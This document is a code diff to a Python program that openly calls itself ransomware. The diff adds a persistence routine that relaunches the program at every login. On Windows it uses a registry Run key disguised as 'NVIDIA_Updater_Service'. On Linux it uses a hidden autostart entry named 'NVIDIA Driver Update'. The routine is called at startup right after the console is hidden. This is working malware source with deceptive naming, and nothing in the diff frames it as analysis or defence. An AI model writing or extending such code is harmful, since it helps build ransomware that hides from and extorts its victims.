@@ -58,6 +58,49 @@ def hide_console():
         except Exception as e:
             log_error(f"Failed to hide console: {e}")
 
+def establish_persistence():
+    """
+    Creates a startup entry to relaunch the ransomware on login.
+    Supports Windows (Registry) and Linux (.config/autostart).
+    """
+    try:
+        # Get the absolute path of the current script/executable
+        if getattr(sys, 'frozen', False):
+            app_path = sys.executable
+        else:
+            app_path = os.path.abspath(__file__)
+
+        if os.name == 'nt': # Windows Persistence
+            import winreg
+            key = winreg.HKEY_CURRENT_USER
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            
+            try:
+                with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "NVIDIA_Updater_Service", 0, winreg.REG_SZ, app_path)
+                log_error("Windows persistence established via Registry.")
+            except Exception as e:
+                log_error(f"Failed to set Windows persistence: {e}")
+
+        else: # Linux Persistence
+            autostart_dir = os.path.expanduser("~/.config/autostart")
+            if not os.path.exists(autostart_dir):
+                os.makedirs(autostart_dir)
+            
+            desktop_file = os.path.join(autostart_dir, "nvidia_driver_update.desktop")
+            with open(desktop_file, "w") as f:
+                f.write(f"""[Desktop Entry]
+Type=Application
+Name=NVIDIA Driver Update
+Exec=python3 "{app_path}"
+X-GNOME-Autostart-enabled=true
+NoDisplay=true
+""")
+            log_error(f"Linux persistence established at {desktop_file}")
+
+    except Exception as e:
+        log_error(f"General persistence failure: {e}")
+
 # --- Cryptography ---
 def generate_aes_key():
     return os.urandom(32)
@@ -494,6 +537,8 @@ class RansomwareGUI:
 # --- Main Execution ---
 if __name__ == "__main__":
     hide_console()
+
+    establish_persistence()
 
     # PERSISTENCE CHECK
     # 1. Check for ID File (Primary Recovery)
